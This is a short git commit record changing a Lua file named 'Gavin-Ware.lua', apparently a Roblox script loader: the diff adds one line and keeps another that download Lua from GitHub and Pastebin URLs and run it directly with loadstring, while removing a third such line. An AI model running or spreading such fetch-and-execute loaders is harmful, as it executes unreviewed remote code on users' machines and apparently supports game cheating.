c49872adcaec02a9ee8e46075f4b6727b2a60ba2
NemoExeYT <70239152+NEMOEXEYT@users.noreply.github.com>
2022-08-10 08:43:57 +0200

    Update Gavin-Ware.lua

--- Gavin-Ware.lua
+++ Gavin-Ware.lua
@@ -1,2 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vodxn/sape/main/Initiate.lua"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/qWAmaibV"))()
-loadstring(game:HttpGet("https://pastebin.com/raw/RGKJ9QdF"))()
